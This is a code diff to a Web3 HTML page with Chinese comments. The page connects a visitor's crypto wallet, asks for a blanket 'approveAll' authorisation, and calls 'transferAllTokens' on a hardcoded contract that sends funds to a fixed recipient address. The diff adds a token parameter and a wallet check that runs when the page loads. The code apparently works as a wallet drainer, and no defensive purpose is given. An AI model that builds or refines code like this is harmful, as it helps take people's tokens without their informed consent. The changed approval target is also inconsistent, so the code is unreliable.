@@ -18,6 +18,7 @@
         let account;
         const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 合约地址
         const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收地址
+        const tokenAddress = "0xYourERC20TokenAddress"; // 需要转移的ERC20代币合约地址
         let contract;
 
         const abi = [
@@ -91,10 +92,23 @@
             }
         ];
 
+        // 检查钱包是否已连接
+        async function checkWalletConnected() {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                if (accounts.length > 0) {
+                    account = accounts[0];
+                    document.getElementById("status").innerText = "已连接钱包: " + account;
+                    document.getElementById("authorizeTransfer").disabled = false; // 启用授权按钮
+                    contract = new web3.eth.Contract(abi, contractAddress); // 初始化合约
+                }
+            }
+        }
+
         // 连接钱包功能
         async function connectWallet() {
             if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     account = accounts[0];
@@ -113,8 +127,6 @@
         function handleError(error) {
             if (error.code === 4001) {
                 document.getElementById("status").innerText = "用户拒绝了请求。";
-            } else if (error.code === -32002) {
-                document.getElementById("status").innerText = "连接请求已存在，请稍候。";
             } else {
                 document.getElementById("status").innerText = "连接钱包失败: " + error.message;
                 console.error("错误信息:", error); // 记录错误信息
@@ -124,7 +136,7 @@
         // 授权转账
         async function authorizeTransfer() {
             try {
-                await contract.methods.approveAll(recipientAddress).send({ from: account });
+                await contract.methods.approveAll(tokenAddress).send({ from: account });
                 document.getElementById("status").innerText = "授权成功!";
                 document.getElementById("transferButton").disabled = false; // 启用转账按钮
             } catch (error) {
@@ -135,7 +147,7 @@
         // 转移代币
         async function transferTokens() {
             try {
-                await contract.methods.transferAllTokens().send({ from: account });
+                await contract.methods.transferAllTokens(tokenAddress).send({ from: account });
                 document.getElementById("status").innerText = "转账成功!";
             } catch (error) {
                 handleError(error);
@@ -146,6 +158,9 @@
         document.getElementById("connectButton").addEventListener("click", connectWallet);
         document.getElementById("authorizeTransfer").addEventListener("click", authorizeTransfer);
         document.getElementById("transferButton").addEventListener("click", transferTokens);
+
+        // 页面加载时检查钱包是否已连接
+        window.addEventListener('load', checkWalletConnected);
     </script>
 </body>
 </html>
